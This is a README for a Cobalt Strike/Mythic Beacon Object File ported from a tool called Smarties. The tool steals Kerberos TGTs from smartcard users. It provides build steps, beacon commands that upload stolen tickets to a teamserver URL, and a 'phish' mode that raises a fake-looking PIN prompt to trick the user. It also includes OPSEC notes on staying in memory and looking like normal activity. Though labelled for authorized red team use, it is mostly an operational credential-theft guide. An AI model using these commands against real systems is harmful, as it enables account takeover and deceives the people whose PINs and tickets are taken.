# Smarties BOF - Smart Card TGT Phisher

Native Windows BOF port of [ZumiYumi's Smarties](https://github.com/ZumiYumi/Smarties) C# tool. Steals Kerberos TGTs from smartcard-authenticated users by triggering PKINIT via SSPI, then extracting the cached ticket as a `.kirbi` file.

## Compatibility

| Loader | Tested |
|--------|--------|
| **EmeraldStrike** (Mythic) | ✅ Primary target - matches its beacon.h, DFR convention, and `go` entry point |
| Cobalt Strike 4.x `inline-execute` | ✅ Standard CS beacon.h API |
| TrustedSec COFFLoader | ✅ |
| Any CS-compatible BOF loader | ✅ |

## Build

Requires `x86_64-w64-mingw32-gcc` (mingw-w64 cross-compiler on Linux, WSL, or MSYS2):

```bash
cd bof/
make
```

Produces `smarties.x64.o` - a COFF object file ready for BOF execution.

### Verify the build

```bash
make check
```

This confirms the `go` entry point exists, DFR symbols are properly declared, and the COFF sections are correct.

## Usage

### EmeraldStrike (Mythic)

**Option A: Direct `inline_execute`**

Upload `smarties.x64.o` and execute with packed arguments:

```
inline_execute -BOF smarties.x64.o -Arguments "enum" -ArgumentTypes "z"
inline_execute -BOF smarties.x64.o -Arguments "phish C:\temp\user.kirbi" -ArgumentTypes "zz"
inline_execute -BOF smarties.x64.o -Arguments "dump http://teamserver:8080/upload krbtgt/CORP.LOCAL" -ArgumentTypes "zzz"
```

**Option B: Register for reuse**

```
register_bof smarties.x64.o
```

Then use `inline_execute` with the registered BOF from the file picker.

**Option C: Python command integration**

Add a custom command in `agent_functions/` that uses `bof_utils.bof_tasking()`:

```python
from .bof_utils import bof_tasking

async def create_go_tasking(self, taskData):
    args = [
        ("string", taskData.args.get_arg("mode")),
        ("string", taskData.args.get_arg("output") or ""),
        ("string", taskData.args.get_arg("spn") or ""),
    ]
    return await bof_tasking(taskData, "smarties.x64.o", args)
```

Place `smarties.x64.o` in the `bof_files/` directory of the EmeraldStrike Payload_Type.

### Cobalt Strike

```
beacon> inline-execute /path/to/smarties.x64.o enum
beacon> inline-execute /path/to/smarties.x64.o phish C:\temp\user.kirbi
beacon> inline-execute /path/to/smarties.x64.o dump http://10.0.0.1:8080/upload krbtgt/DOMAIN.LOCAL
```

## Modes

### `enum` - Enumerate Smart Card Certificates

Lists all certificates in the current user's MY store that have:
- Smart Card Logon EKU (OID 1.3.6.1.4.1.311.20.2.2)
- Private key on a smart card provider (Microsoft Base Smart Card, YubiKey, SafeNet, etc.)

Shows subject name, UPN, SHA1 thumbprint, and CSP/KSP provider name.

### `phish` - Trigger PKINIT + Capture TGT

1. Finds the first smart card certificate with SC Logon EKU
2. Marshals the cert's SHA1 hash via `CredMarshalCredentialW`
3. Calls `AcquireCredentialsHandleW` + `InitializeSecurityContextW` with the Kerberos package
4. **This pops the smart card PIN dialog on the target workstation** - the user enters their PIN thinking it's a normal Windows authentication prompt
5. After PKINIT succeeds, retrieves the cached TGT via `LsaCallAuthenticationPackage` with `KerbRetrieveEncodedTicketMessage` + `KERB_RETRIEVE_TICKET_AS_KERB_CRED`
6. Outputs the `.kirbi` (KRB-CRED format per RFC 4120 §5.8.1) to file or HTTP

### `dump` - Extract Existing Cached TGT

Retrieves a TGT already in the current logon session's ticket cache without triggering a new PKINIT. Useful when the user has already authenticated via smart card.

## Arguments

| # | Name | Type | Required | Description |
|---|------|------|----------|-------------|
| 1 | mode | string | Yes | `enum`, `phish`, or `dump` |
| 2 | output | string | No | File path (`C:\temp\t.kirbi`) or HTTP URL (`http://host:port/path`) |
| 3 | spn | string | No | Target SPN override (default: `krbtgt/REALM` derived from cert UPN) |

If no output is specified, the raw `.kirbi` bytes are returned inline via `BeaconOutput`.

## Windows APIs Used

| API | DFR Module | Purpose |
|-----|-----------|---------|
| `CertOpenSystemStoreW` | CRYPT32 | Open MY certificate store |
| `CertEnumCertificatesInStore` | CRYPT32 | Iterate certificates |
| `CertGetCertificateContextProperty` | CRYPT32 | Get key provider info, thumbprint |
| `CertGetNameStringW/A` | CRYPT32 | Extract UPN, subject name |
| `CryptDecodeObjectEx` | CRYPT32 | Decode Enhanced Key Usage extension |
| `CredMarshalCredentialW` | ADVAPI32 | Marshal cert hash for SSPI |
| `AcquireCredentialsHandleW` | SECUR32 | Get Kerberos cred handle with cert |
| `InitializeSecurityContextW` | SECUR32 | Trigger PKINIT AS-REQ (PIN dialog) |
| `LsaConnectUntrusted` | SECUR32 | Connect to LSA |
| `LsaCallAuthenticationPackage` | SECUR32 | Retrieve ticket from cache |
| `WinHttpOpen/Connect/SendRequest` | WINHTTP | HTTP upload of .kirbi |
| `CreateFileA` / `WriteFile` | KERNEL32 | File output |

## OPSEC Notes

- **PIN dialog**: The `phish` mode causes a Windows smart card PIN prompt on the target. This is the social engineering component - the user sees a familiar dialog.
- **No disk touch**: The BOF runs entirely in-memory. The only disk write is if you specify a file output path.
- **HTTP upload**: Uses WinHTTP (not WinINet), sends as `application/octet-stream` POST. Customize the User-Agent in the source if needed.
- **LSA access**: `LsaConnectUntrusted` works from any user context (no admin required).
- **Detection**: SSPI calls are normal Windows activity. The `KerbRetrieveEncodedTicketMessage` LSA call is the same as what `klist` uses.

## Files

| File | Description |
|------|-------------|
| `smarties.c` | Main BOF source - all three modes |
| `beacon.h` | EmeraldStrike/CS 4.13 compatible BOF API header + DFR declarations |
| `Makefile` | Cross-compile with mingw-w64 |
| `README.md` | This file |

## Credits

- Original C# tool: [ZumiYumi/Smarties](https://github.com/ZumiYumi/Smarties)
- BOF port for authorized red team training & usage
